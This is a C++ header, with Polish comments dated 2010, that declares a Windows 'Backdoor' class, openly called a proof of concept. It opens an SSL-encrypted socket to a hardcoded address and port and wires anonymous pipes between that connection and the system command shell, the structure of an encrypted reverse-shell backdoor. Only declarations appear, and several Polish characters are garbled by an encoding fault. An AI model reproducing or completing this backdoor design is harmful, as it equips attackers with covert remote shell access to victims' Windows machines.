#ifndef _BACKDOOR_H_
#define _BACKDOOR_H_
#include <openssl/ssl.h>    /* -l libssleay32.a */
#include <windows.h>        /* -l libws2_32.a */

#if BUILDING_DLL
# define DLLIMPORT __declspec (dllexport)
#else /* Not BUILDING_DLL */
# define DLLIMPORT __declspec (dllimport)
#endif /* Not BUILDING_DLL */

#define __RECV_SIZE__ 10000   /* Stroustrup m�wi zamiast define const */
                              /* zamiast MACRO inline , ale define nie alokuje pami�ci */
                              /* const alokuje (czasami) co do MACRO mog� si� z nim zgodzi� ;D */

/* ------------------------------ */
/* ~echo 2010                    */
/* Minimalistycznie bez string�w  */
/* wyj�tk�w strumieni , RTTI      */
/* , szablon�w  ,  autoPter�w :>  */
/* ------------------------------ */


#define __SOCKET_ERROR__ 666
#define __SSL_ERROR__ 1984
#define __CMD_ERROR__ 1337

typedef struct SSL_INFO                   /*Potrzebujemy wszystkich poiter�w dla Free*/
{
       SSL* pack;
       SSL_CTX* config;
       SSL_METHOD* version;               /* tego si� nie zwalnia bo to nie jest na stercie */
                                          /* to sobie wyzeruje */
       unsigned int __error;              /* 0 */                     
}SSL_PROTO;

#define _IP "127.0.0.1"                   // na sztywno ale to tylko poc
#define _PORT 81

class /*DLLIMPORT ( to nam nie potrzebne )*/ Backdoor
{  
   int __socket;                                          
   Backdoor(const Backdoor&);
   const Backdoor& operator=(const Backdoor&);  
   Backdoor();
   static Backdoor* __instance;
       
              
   HANDLE system_in , system_out;                          /* ��cznie 4 uchwyty poniewa� */
   HANDLE bdoor_in , bdoor_out;                            /* potoki nie nazwane s� jednokierunkowe */
   char system_path[MAX_PATH + 2];                         
   void initSystemPath();                                
                
   public:     
   ~Backdoor();   
   static Backdoor* getInstance();                                       
   PROCESS_INFORMATION ioInitial();                       
   int proxyIoManager(SSL* ioMaster);                      
   SSL_PROTO cryptoSockInit(const char* IP,unsigned int port);  /**/    
   void sslRelease(SSL_PROTO& ptr);                             
   //.........
};

Backdoor* Backdoor::__instance = 0;


